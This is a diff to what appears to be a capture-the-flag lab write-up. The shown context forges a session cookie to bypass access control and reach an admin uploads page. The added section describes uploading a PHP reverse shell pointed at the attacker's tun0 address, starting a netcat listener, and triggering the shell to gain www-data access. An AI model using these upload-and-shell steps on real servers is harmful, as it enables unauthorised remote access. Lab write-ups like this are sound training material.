@@ -38,14 +38,22 @@ document.cookie = "user=34322; path=/"
 
 Server accepted session cookies with additional verification -- broken access control. Allowed access to admin-restricted "Uploads" page
 
+**PHP Reverse Shell**
 
+Changed /user/share/webshells/php/php-reverse-shell.php with tun0 ip. Uploaded the shell to the upload page. 
 
+Set up listener:
+```bash
+nc -lvvp 1234
+```
 
+Triggered shell by visiting 
 
+http://10.129.76.27/uploads/php-reverse-shell.php
 
+Caught shell as www-data
 
-
-
+---
 
 
 
